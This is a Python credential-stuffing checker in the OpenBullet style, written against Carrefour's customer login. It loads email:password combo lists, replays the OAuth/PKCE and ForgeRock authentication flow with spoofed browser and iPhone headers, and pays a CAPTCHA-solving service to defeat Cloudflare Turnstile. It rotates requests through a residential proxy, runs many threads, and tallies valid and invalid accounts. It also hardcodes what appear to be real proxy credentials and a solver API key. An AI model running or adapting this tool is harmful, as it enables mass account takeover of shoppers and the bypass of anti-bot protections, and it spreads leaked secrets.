#!/usr/bin/env python3
"""
Flux style OpenBullet : PKCE → authorize → ForgeRock → Solverify Turnstile → POST login.

Valeurs par défaut : fichier combos `s.txt`, proxy DataImpulse et clé Solverify préremplis dans le script
(constantes DEFAULT_* ; surcharge via arguments ou variables d'environnement).

Mode interactif : invites avec défauts entre crochets (Entrée = défaut).

En cas d'erreur : exception FlowError avec corps HTTP (SOURCE) ; mode liste affiche SOURCE pour erreurs et pour
réponses RETRY / CUSTOM / UNKNOWN.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import secrets
import string
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any

import requests

# Préconfiguration (surcharge possible : --combo-file, --proxy, --solver-key, variables d'environnement)
DEFAULT_COMBO_FILE = "s.txt"
DEFAULT_PROXY_URL = "http://82d92d98f73844034775:2206992348172521@gw.dataimpulse.com:823"
DEFAULT_SOLVERIFY_KEY = "NHpps0GHnBe0v7MmFim6INi990j1drzhv49EUko3t0q8FStXRboY3ctdyU6i85TX"

# --- PKCE (same alphabet as RFC 7636 / original Node script) ---
_VERIFIER_CHARS = string.ascii_letters + string.digits + "-._~"


class FlowError(Exception):
    """Erreur métier avec corps HTTP / SOURCE optionnel pour diagnostic."""

    def __init__(self, message: str, source: str | None = None) -> None:
        super().__init__(message)
        self.source = source if source is not None else ""


def generate_code_verifier(length: int = 128) -> str:
    return "".join(secrets.choice(_VERIFIER_CHARS) for _ in range(length))


def base64url_encode_raw(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def generate_code_challenge(code_verifier: str) -> str:
    digest = hashlib.sha256(code_verifier.encode("utf-8")).digest()
    return base64url_encode_raw(digest)


def _proxy_dict(proxy_url: str | None) -> dict[str, str] | None:
    if not proxy_url:
        return None
    return {"http": proxy_url, "https": proxy_url}


class ForwardingSession:
    """Either talks to local forwarder (postUrl/postProxy) or uses requests directly with PROXY_URL."""

    def __init__(
        self,
        *,
        proxy_url: str | None,
        forward_base: str | None,
        timeout: float = 60.0,
    ) -> None:
        self._proxy_url = proxy_url
        self._forward_base = forward_base.rstrip("/") if forward_base else None
        self._timeout = timeout
        self._session = requests.Session()

    def request(
        self,
        method: str,
        url: str,
        *,
        headers: dict[str, str] | None = None,
        data: str | bytes | None = None,
        json_body: Any = None,
        allow_redirects: bool = False,
    ) -> requests.Response:
        hdrs = dict(headers or {})
        proxies = _proxy_dict(self._proxy_url)

        if self._forward_base:
            hdrs["postUrl"] = url
            if self._proxy_url:
                hdrs["postProxy"] = self._proxy_url
            req_url = self._forward_base + "/"
            return self._session.request(
                method,
                req_url,
                headers=hdrs,
                data=data,
                json=json_body,
                allow_redirects=allow_redirects,
                timeout=self._timeout,
            )

        return self._session.request(
            method,
            url,
            headers=hdrs,
            data=data,
            json=json_body,
            allow_redirects=allow_redirects,
            proxies=proxies,
            timeout=self._timeout,
        )


def _location(resp: requests.Response) -> str | None:
    loc = resp.headers.get("Location") or resp.headers.get("location")
    return loc


def _absolute(base: str, loc: str) -> str:
    return urllib.parse.urljoin(base, loc)


def parse_lr(text: str, left: str, right: str) -> str | None:
    try:
        start = text.index(left) + len(left)
        end = text.index(right, start)
        return text[start:end]
    except ValueError:
        return None


def extract_json_token(source: str, key: str) -> Any:
    data = json.loads(source)
    cur: Any = data
    for part in key.split("."):
        if isinstance(cur, dict) and part in cur:
            cur = cur[part]
        else:
            return None
    return cur


def _extract_turnstile_token(obj: dict[str, Any]) -> str | None:
    """Solver responses vary; original blocks read JSON key `value`."""
    if isinstance(obj.get("value"), str):
        return obj["value"]
    sol = obj.get("solution")
    if isinstance(sol, dict):
        for k in ("token", "cf-turnstile-response", "value"):
            v = sol.get(k)
            if isinstance(v, str) and v:
                return v
    return None


def poll_turnstile_token(
    session: ForwardingSession,
    *,
    solver_key: str,
    task_id: str,
    poll_interval: float = 2.0,
    max_wait: float = 120.0,
) -> str:
    """
    Comme OpenBullet : tant que la réponse contient « processing », refaire POST getTaskResult ;
    parser le jeton quand la réponse JSON expose la valeur (clé `value` ou solution.token).
    """
    deadline = time.monotonic() + max_wait
    payload = {"clientKey": solver_key, "taskId": task_id}
    payload_json = json.dumps(payload)
    last_body = ""

    while time.monotonic() < deadline:
        r = session.request(
            "POST",
            "https://solver.solverify.net/getTaskResult",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=payload_json,
        )
        body = r.text
        last_body = body
        if "processing" in body:
            time.sleep(poll_interval)
            continue

        try:
            obj = json.loads(body)
        except json.JSONDecodeError:
            time.sleep(poll_interval)
            continue

        err_id = obj.get("errorId")
        if err_id not in (0, None) and err_id != "0":
            raise FlowError(f"getTaskResult error: {obj}", source=body)

        token = _extract_turnstile_token(obj)
        if token:
            return token

        # Pas encore de token lisible (ex. statut completed mais champ différent) : réessayer
        time.sleep(poll_interval)

    raise FlowError("Turnstile task did not complete in time", source=last_body)


def run_flow(
    *,
    username: str,
    password: str,
    proxy_url: str | None,
    solver_key: str,
    forward_base: str | None = None,
) -> dict[str, Any]:
    code_verifier = generate_code_verifier()
    code_challenge = generate_code_challenge(code_verifier)

    session = ForwardingSession(proxy_url=proxy_url, forward_base=forward_base)

    # 1) Initial authorize (iOS client)
    authorize_qs = urllib.parse.urlencode(
        {
            "response_type": "code",
            "client_id": "carrefour_onecarrefour_ios",
            "scope": "openid iam",
            "redirect_uri": "fr.carrefourconnect://redirect_uri",
            "code_challenge": code_challenge,
            "code_challenge_method": "S256",
        },
        safe="",
    )
    url1 = f"https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?{authorize_qs}"
    h1 = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
        ),
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.8",
    }
    r1 = session.request("GET", url1, headers=h1, allow_redirects=False)
    loc1 = _location(r1)
    if not loc1:
        raise FlowError(
            f"No Location after authorize: status={r1.status_code}",
            source=r1.text,
        )

    # 2) Follow Location1 with browser headers
    url2 = _absolute("https://moncompte.carrefour.fr/", loc1)
    h2 = {
        **h1,
        "Connection": "close",
        "Host": "moncompte.carrefour.fr",
        "Referer": "https://www.carrefour.fr/",
        'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
        "sec-ch-ua-mobile": "?0",
        'sec-ch-ua-platform': '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    }
    r2 = session.request("GET", url2, headers=h2, allow_redirects=False)
    loc2 = _location(r2)
    if not loc2:
        raise FlowError(
            f"No Location after second GET: status={r2.status_code}",
            source=r2.text,
        )

    # 3) GET moncompte path from loc2
    url3 = _absolute("https://moncompte.carrefour.fr", loc2)
    h3 = {
        "User-Agent": h1["User-Agent"],
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.8",
    }
    session.request("GET", url3, headers=h3, allow_redirects=False)

    # 4) Anonymous authenticate (empty JSON body as in original)
    goto_ios = (
        "http://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?"
        f"client_id=carrefour_onecarrefour_ios&code_challenge={urllib.parse.quote(code_challenge)}"
        "&code_challenge_method=S256&redirect_uri=fr.carrefourconnect://redirect_uri"
        "&response_type=code&scope=openid iam"
    )
    auth_url = (
        "https://moncompte.carrefour.fr/iam/json/authenticate?"
        + urllib.parse.urlencode({"goto": goto_ios, "realm": "/CarrefourConnect"})
    )
    h4 = {
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://moncompte.carrefour.fr/iam/XUI/",
        "X-NoSession": "true",
        "X-Username": "anonymous",
        "Origin": "https://moncompte.carrefour.fr/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Content-Length": "0",
        "Connection": "keep-alive",
        "X-Password": "anonymous",
        "Accept-Language": "fr-FR",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-API-Version": "protocol=1.0,resource=2.0",
        "Sec-Fetch-Mode": "cors",
    }
    r4 = session.request("POST", auth_url, headers=h4, data="", allow_redirects=False)
    src4 = r4.text
    auth_id = parse_lr(src4, 'authId":"', '"')
    if not auth_id:
        # try JSON path
        try:
            auth_id = extract_json_token(src4, "authId")
        except json.JSONDecodeError:
            auth_id = None
    if not auth_id:
        raise FlowError("Could not parse authId from authenticate response", source=src4)

    # 5) Create Turnstile task
    task_payload = {
        "clientKey": solver_key,
        "task": {
            "type": "turnstile",
            "websiteURL": "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize",
            "websiteKey": "0x4AAAAAAADaNvwE6lw9Qsdq",
            "cdata": "",
            "action": "LOGIN",
        },
    }
    r5 = session.request(
        "POST",
        "https://solver.solverify.net/createTask",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=json.dumps(task_payload),
    )
    try:
        task_body = json.loads(r5.text)
    except json.JSONDecodeError:
        raise FlowError(f"createTask invalid JSON: status={r5.status_code}", source=r5.text)
    err_id = task_body.get("errorId")
    if err_id not in (0, None, "0"):
        raise FlowError(f"createTask error: {task_body}", source=r5.text)
    task_id = task_body.get("taskId")
    if not task_id:
        raise FlowError("No taskId in createTask response", source=r5.text)

    token44 = poll_turnstile_token(session, solver_key=solver_key, task_id=str(task_id))

    # 6) Login POST (matches original JSON structure; goto uses web client)
    goto_web = (
        "http://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?"
        "client_id=carrefour_onecarrefour_web&redirect_uri=https%3A%2F%2Fwww.carrefour.fr%2Flogin%2Fcheck"
        "&response_type=code&scope=openid iam register-aHR0cHM6Ly93d3cuY2FycmVmb3VyLmZyL21vbi1jb21wdGUvaW5zY3JpcHRpb24%3D"
    )
    login_auth_url = (
        "https://moncompte.carrefour.fr/iam/json/authenticate?"
        + urllib.parse.urlencode({"realm": "/CarrefourConnect", "goto": goto_web})
    )
    login_body = {
        "authId": auth_id,
        "template": "",
        "stage": "CarrefourIAMLDAP1",
        "header": "Content de vous (re)voir !",
        "callbacks": [
            {
                "type": "NameCallback",
                "output": [{"name": "prompt", "value": "Adresse électronique"}],
                "input": [{"name": "IDToken1", "value": username}],
            },
            {
                "type": "PasswordCallback",
                "output": [{"name": "prompt", "value": "Mot de passe"}],
                "input": [{"name": "IDToken2", "value": password}],
            },
            {
                "type": "CaptchaCallback",
                "output": [
                    {"name": "version", "value": "V2(Invisible)"},
                    {"name": "prompt", "value": "0x4AAAAAAADaNvwE6lw9Qsdq"},
                ],
                "input": [{"name": "IDToken3", "value": token44}],
            },
        ],
    }
    h6 = {
        "Host": "moncompte.carrefour.fr",
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache",
        "User-Agent": h4["User-Agent"],
        "Referer": "https://moncompte.carrefour.fr/iam/XUI/",
        "X-NoSession": "true",
        "X-Username": "anonymous",
        "Origin": "https://moncompte.carrefour.fr",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Connection": "keep-alive",
        "X-Password": "anonymous",
        "Accept-Language": "fr-FR",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-API-Version": "protocol=1.0,resource=2.0",
        "Sec-Fetch-Mode": "cors",
    }
    r6 = session.request(
        "POST",
        login_auth_url,
        headers=h6,
        data=json.dumps(login_body, ensure_ascii=False),
        allow_redirects=False,
    )
    text6 = r6.text

    outcome = classify_login_response(text6)
    return {
        "code_verifier": code_verifier,
        "code_challenge": code_challenge,
        "auth_id": auth_id,
        "task_id": task_id,
        "turnstile_token": token44,
        "login_status": r6.status_code,
        "login_body": text6,
        "outcome": outcome,
    }


def load_combos(path: str) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                continue
            user, pw = line.split(":", 1)
            user, pw = user.strip(), pw.strip()
            if user and pw:
                pairs.append((user, pw))
    return pairs


class RunStats:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self.valid = 0
        self.invalid = 0
        self.error = 0
        self._done = 0
        self._start = time.monotonic()

    def record(self, outcome: str, exc: bool = False) -> None:
        with self._lock:
            self._done += 1
            if exc:
                self.error += 1
            elif outcome == "SUCCESS":
                self.valid += 1
            elif outcome == "FAIL":
                self.invalid += 1
            else:
                self.error += 1

    def cpm(self) -> float:
        elapsed = max(time.monotonic() - self._start, 1e-6)
        return self._done / elapsed * 60.0

    def snapshot(self) -> tuple[int, int, int, int, float]:
        with self._lock:
            return self.valid, self.invalid, self.error, self._done, self._done / max(time.monotonic() - self._start, 1e-6) * 60.0


def _prompt_nonempty(label: str, secret: bool = False, default: str | None = None) -> str:
    hint = f" [{default}]" if default else ""
    while True:
        if secret:
            try:
                import getpass

                v = getpass.getpass(f"{label}{hint}: ").strip()
            except (EOFError, KeyboardInterrupt):
                raise
        else:
            try:
                v = input(f"{label}{hint}: ").strip()
            except EOFError:
                v = ""
        if not v and default is not None:
            return default
        if v:
            return v
        print("(valeur requise)", file=sys.stderr)


def _prompt_int(label: str, default: int = 1, minimum: int = 1, maximum: int = 500) -> int:
    while True:
        try:
            raw = input(f"{label} [{default}]: ").strip()
        except EOFError:
            return default
        if not raw:
            return max(minimum, min(default, maximum))
        try:
            n = int(raw)
            if minimum <= n <= maximum:
                return n
        except ValueError:
            pass
        print(f"Entier entre {minimum} et {maximum}.", file=sys.stderr)


def process_combo(
    username: str,
    password: str,
    *,
    proxy_url: str | None,
    solver_key: str,
    forward_base: str | None,
) -> tuple[str, bool, str | None]:
    """Returns (outcome, is_exception, response_source_or_None)."""
    try:
        result = run_flow(
            username=username,
            password=password,
            proxy_url=proxy_url,
            solver_key=solver_key,
            forward_base=forward_base,
        )
        outcome = str(result.get("outcome", "UNKNOWN"))
        src = result.get("login_body") if outcome in ("RETRY", "CUSTOM", "UNKNOWN") else None
        return outcome, False, src if isinstance(src, str) else None
    except FlowError as e:
        return "EXCEPTION", True, e.source or str(e)
    except requests.HTTPError as e:
        resp = e.response
        src = resp.text if resp is not None else str(e)
        return "EXCEPTION", True, src
    except Exception as e:
        return "EXCEPTION", True, str(e)


def run_checker(
    combos: list[tuple[str, str]],
    *,
    proxy_url: str | None,
    solver_key: str,
    forward_base: str | None,
    max_workers: int,
) -> RunStats:
    stats = RunStats()
    total = len(combos)
    lock_print = threading.Lock()

    def on_done(_fut: Any = None) -> None:
        v, inv, err, done, cpm = stats.snapshot()
        with lock_print:
            print(
                f"\r[{done}/{total}] valid={v} invalid={inv} error={err} cpm={cpm:.1f}",
                end="",
                flush=True,
            )

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = []
        for user, pw in combos:
            futures.append(
                ex.submit(
                    process_combo,
                    user,
                    pw,
                    proxy_url=proxy_url,
                    solver_key=solver_key,
                    forward_base=forward_base,
                )
            )
        for fut in as_completed(futures):
            try:
                outcome, is_exc, err_src = fut.result()
                stats.record(outcome, exc=is_exc)
                if is_exc and err_src:
                    with lock_print:
                        print(f"\n--- SOURCE (erreur) ---\n{err_src}\n--- fin SOURCE ---", flush=True)
                elif not is_exc and err_src and outcome in ("RETRY", "CUSTOM", "UNKNOWN"):
                    with lock_print:
                        print(
                            f"\n--- SOURCE ({outcome}) ---\n{err_src}\n--- fin SOURCE ---",
                            flush=True,
                        )
            except Exception as e:
                stats.record("UNKNOWN", exc=True)
                with lock_print:
                    print(f"\n--- SOURCE (erreur interne) ---\n{e!s}\n--- fin SOURCE ---", flush=True)
            on_done()

    print()
    return stats


def classify_login_response(source: str) -> str:
    if "successUrl" in source:
        return "SUCCESS"
    if "Domaine non valide" in source:
        return "RETRY"
    fail_markers = (
        "Votre adresse ou mot de passe ne sont pas valides",
        "Compte suspendu",
        "was expecting comma to separate Object entries",
        "Changement de mot de passe",
        "Unrecognized character escape ",
    )
    if any(m in source for m in fail_markers):
        return "FAIL"
    if "Aidez-nous à confirmer votre identité" in source:
        return "CUSTOM"
    return "UNKNOWN"


def main() -> None:
    parser = argparse.ArgumentParser(description="Carrefour OAuth / PKCE check flow (batch ou un compte).")
    parser.add_argument("--combo-file", help="Fichier email:motdepasse (une ligne par compte)")
    parser.add_argument("--proxy", help="Proxy http://user:pass@host:port")
    parser.add_argument("--solver-key", help="Clé API Solverify (captcha)")
    parser.add_argument("--threads", type=int, default=0, help="Nombre de threads (0 = demandé si mode liste)")
    parser.add_argument("--forward-url", help="Forwarder local optionnel (ex: http://127.0.0.1:5000)")
    parser.add_argument(
        "--single",
        action="store_true",
        help="Un seul compte via SOLVERIFY_KEY, CARREFOUR_USER, CARREFOUR_PASS (utile en terminal interactif)",
    )
    args = parser.parse_args()

    forward_base = (args.forward_url or os.environ.get("LOCAL_FORWARD_URL", "").strip()) or None

    env_solver = os.environ.get("SOLVERIFY_KEY", "").strip()
    env_user = os.environ.get("CARREFOUR_USER", "").strip()
    env_pass = os.environ.get("CARREFOUR_PASS", "").strip()
    env_proxy = os.environ.get("PROXY_URL", "").strip() or None

    is_tty = sys.stdin.isatty() and sys.stdout.isatty()
    batch_mode = bool(args.combo_file) or (is_tty and not args.single)

    if batch_mode:
        combo_path = args.combo_file
        if not combo_path:
            if is_tty:
                combo_path = _prompt_nonempty(
                    "Chemin du fichier combos (email:pass)",
                    default=DEFAULT_COMBO_FILE,
                )
            else:
                combo_path = DEFAULT_COMBO_FILE

        proxy_url = args.proxy or env_proxy
        if not proxy_url:
            if is_tty:
                proxy_url = _prompt_nonempty(
                    "Proxy (http://user:pass@host:port)",
                    default=DEFAULT_PROXY_URL,
                )
            else:
                proxy_url = DEFAULT_PROXY_URL
        proxy_url = proxy_url.strip()
        if not proxy_url.lower().startswith("http"):
            print("Le proxy doit commencer par http:// ou https://", file=sys.stderr)
            raise SystemExit(2)

        solver_key = (args.solver_key or env_solver or "").strip()
        if not solver_key:
            if is_tty:
                solver_key = _prompt_nonempty(
                    "Clé API captcha (Solverify)",
                    default=DEFAULT_SOLVERIFY_KEY,
                ).strip()
            else:
                solver_key = DEFAULT_SOLVERIFY_KEY

        max_workers = args.threads if args.threads > 0 else (_prompt_int("Nombre de threads", default=3) if is_tty else 3)

        combos = load_combos(combo_path)
        if not combos:
            raise SystemExit(f"Aucune ligne valide dans {combo_path}")
        print(f"Chargé {len(combos)} combo(s), {max_workers} thread(s).", flush=True)
        stats = run_checker(
            combos,
            proxy_url=proxy_url,
            solver_key=solver_key,
            forward_base=forward_base,
            max_workers=max_workers,
        )
        v, inv, err, done, cpm = stats.snapshot()
        print(f"Terminé — valid={v} invalid={inv} error={err} total={done} cpm={cpm:.1f}")
        return

    proxy_url = (args.proxy or env_proxy or DEFAULT_PROXY_URL).strip() if (args.proxy or env_proxy or DEFAULT_PROXY_URL) else None
    solver_key = (args.solver_key or env_solver or DEFAULT_SOLVERIFY_KEY).strip()
    user = env_user
    password = env_pass

    if not solver_key or not user or not password:
        raise SystemExit(
            "Mode liste: lancez en terminal interactif ou passez --combo-file chemin.txt. "
            "Mode un compte: exportez SOLVERIFY_KEY, CARREFOUR_USER, CARREFOUR_PASS ou utilisez --single avec ces variables."
        )

    try:
        result = run_flow(
            username=user,
            password=password,
            proxy_url=proxy_url,
            solver_key=solver_key,
            forward_base=forward_base,
        )
    except FlowError as e:
        print(json.dumps({"error": str(e)}, indent=2), file=sys.stderr)
        print("--- SOURCE ---", file=sys.stderr)
        print(e.source, file=sys.stderr)
        raise SystemExit(1)
    except Exception as e:
        print(json.dumps({"error": str(e)}, indent=2), file=sys.stderr)
        raise SystemExit(1)

    print(json.dumps({k: v for k, v in result.items() if k != "login_body"}, indent=2))
    print("--- login response (truncated) ---")
    body = result["login_body"]
    print(body[:2000] + ("..." if len(body) > 2000 else ""))


if __name__ == "__main__":
    main()
